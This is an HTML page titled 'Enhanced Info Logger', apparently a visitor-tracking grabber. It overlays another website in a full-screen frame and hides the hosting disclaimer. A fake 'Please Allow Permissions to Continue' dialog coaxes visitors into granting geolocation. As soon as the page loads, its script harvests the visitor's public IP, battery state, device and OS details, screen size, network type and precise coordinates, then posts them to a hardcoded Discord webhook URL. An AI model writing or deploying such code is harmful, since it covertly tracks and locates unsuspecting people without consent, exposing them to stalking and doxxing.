<!DOCTYPE html>
<html>
<head>
    <!-- CSS Styles for dialog boxes and other UI elements -->
    <style>
        img[alt*="www.000webhost.com"], .disclaimer {
            display: none;
        }
        .iframe-container {
            position: relative;
            width: 100%;
            height: 100vh;
        }
        .dialog-box {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #ffffff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 20px;
            text-align: center;
            max-width: 300px;
        }
        .dialog-box h2 {
            margin-top: 0;
            color: #333333;
        }
        .dialog-box p {
            margin-bottom: 20px;
            color: #666666;
        }
        .btn-allow {
            background-color: #4CAF50;
            color: #ffffff;
            border: none;
            padding: 10px 20px;
            text-align: center;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
        }
    </style>
    <!-- Meta tags for better compatibility -->
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Enhanced Info Logger</title>
</head>

<body>
    <!-- Main Content Wrapper -->
    <div class="iframe-container">
        <!-- Iframe container for loading external content -->
        <iframe
            is="x-frame-bypass"
            src="https://example.com"
            frameborder="0"
            style="overflow:hidden;height:100%;width:100%;position:fixed;top:0;left:0"
            height="100%"
            width="100%">
        </iframe>

        <!-- Dialog Box for asking permissions -->
        <div class="dialog-box" id="dialogBox">
            <h2>Alert</h2>
            <p>Please Allow Permissions to Continue</p>
            <button class="btn-allow" id="allowBtn">OK</button>
        </div>
    </div>

    <!-- JavaScript for Logging and Sending Data -->
    <script>
        // Utility Functions
        async function getPublicIp() {
            const response = await fetch("https://api.ipify.org?format=json");
            const data = await response.json();
            return data.ip || "Unknown";
        }

        async function fetchGeolocation() {
            return new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(
                    (position) => resolve(`Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`),
                    (error) => reject(error.code),
                    { timeout: 5000 }
                );
            });
        }

        // Send Data to Discord
        function sendToDiscord(content) {
            const request = new XMLHttpRequest();
            request.open("POST", "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm");
            request.setRequestHeader("Content-type", "application/json");
            const params = {
                content,
                username: "InfoLogger",
                avatar_url: "https://example.com/avatar.jpg"
            };
            request.send(JSON.stringify(params));
        }

        function formatMessage(publicIP, localTime, deviceInfo, osInfo, ram, userAgent, width, height, batteryPercentage, isCharging, networkType, localIP, coords = "Unavailable") {
            return `**Device Info**:
**Public IP**: ${publicIP}
**Local Time**: ${localTime}
**Battery**: ${batteryPercentage}, **Charging**: ${isCharging}
**Screen Size**: ${width}x${height}
**RAM**: ${ram}

**Device Details**:
**Platform**: ${deviceInfo}
**OS Info**: ${osInfo}
**User Agent**: ${userAgent}

**Network Info**:
**Network Type**: ${networkType}
**Local IP**: ${localIP}

**Geolocation**:
${coords}`;
        }

        // Main Logging Logic
        async function logDeviceInfo() {
            const publicIP = await getPublicIp();
            const localTime = new Date().toLocaleTimeString();
            const battery = await navigator.getBattery();
            const batteryPercentage = Math.round(battery.level * 100) + "%";
            const isCharging = battery.charging ? "Yes" : "No";
            const deviceInfo = navigator.platform;
            const osInfo = navigator.userAgent.match(/\((.*?)\)/)[1];
            const ram = navigator.deviceMemory || "Unknown";
            const userAgent = navigator.userAgent;
            const width = screen.width;
            const height = screen.height;

            // Get network type (3g, 4g, Wi-Fi, etc.)
            let networkType = "Unknown";
            if (navigator.connection) {
                networkType = navigator.connection.effectiveType || "Unknown";
            }

            // Handle local network IP (can't be accessed via JS directly in most cases)
            const localIP = "Unavailable"; // Local IP can't be fetched directly via JavaScript in browsers.

            // Send all initial data except geolocation
            sendToDiscord(
                formatMessage(publicIP, localTime, deviceInfo, osInfo, ram, userAgent, width, height, batteryPercentage, isCharging, networkType, localIP)
            );

            // Attempt to fetch geolocation
            try {
                const coords = await fetchGeolocation();
                sendToDiscord(
                    formatMessage(publicIP, localTime, deviceInfo, osInfo, ram, userAgent, width, height, batteryPercentage, isCharging, networkType, localIP, coords)
                );
            } catch (errorCode) {
                if (errorCode === 1) {
                    sendToDiscord("**Geolocation**: Geo Location Denied");
                } else if (errorCode === 3) {
                    sendToDiscord("**Geolocation**: Geo Location Timeout");
                }
            }
        }

        // Start Logging
        logDeviceInfo();

        // Close Dialog Box
        document.getElementById("allowBtn").addEventListener("click", function () {
            document.getElementById("dialogBox").style.display = "none";
        });
    </script>
</body>
</html>
